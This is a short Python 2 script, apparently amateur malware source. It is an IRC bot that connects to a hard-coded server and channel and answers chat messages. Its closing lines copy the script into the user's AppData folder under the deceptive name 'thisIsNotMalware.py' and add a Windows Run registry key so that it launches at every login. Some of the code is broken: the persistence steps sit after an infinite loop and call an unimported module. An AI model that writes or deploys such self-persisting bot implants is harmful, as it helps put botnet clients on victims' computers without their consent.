from _winreg import *
from shutil import copy

import os
import random
import socket
import sys

channel = "#ferrusca"
server = "192.168.1.74"
nickname = "algo"


IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send(chan, msg):
    IRC.send("PRIVMSG " + chan + " " + msg + "n")

def connect(server, channel, botnick):
    print "connecting to:"+server
    IRC.connect((server, 6667))                                                         
    IRC.send("USER " + botnick + " " + botnick +" " + botnick + " :This is a fun bot!\n")
    IRC.send("NICK " + botnick + "\n")               
    IRC.send("JOIN " + channel + "\n")        #join the chat

def get_text():
    text=IRC.recv(2040)  #receive the text

    if text.find('PING') != -1:                      
        IRC.send('PONG ' + text.split() [1] + 'r\n') 
    return text

connect(server, channel, nickname)

while 1:
    text = get_text()
    print text
 
    if "PRIVMSG" in text and channel in text and "hello" in text:
        send(channel, "Hello!")



shutil.copy(__file__, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")

# Writing Registry key
keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_CURRENT_USER, keyVal)
# SetValueEx(key, "JLF", 0, REG_SZ, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")
SetValueEx(key, "JLF", 0, REG_EXPAND_SZ, "C:\users\%HOMEPATH%\appdata\roaming\thisIsNotMalware.py")
CloseKey(key)

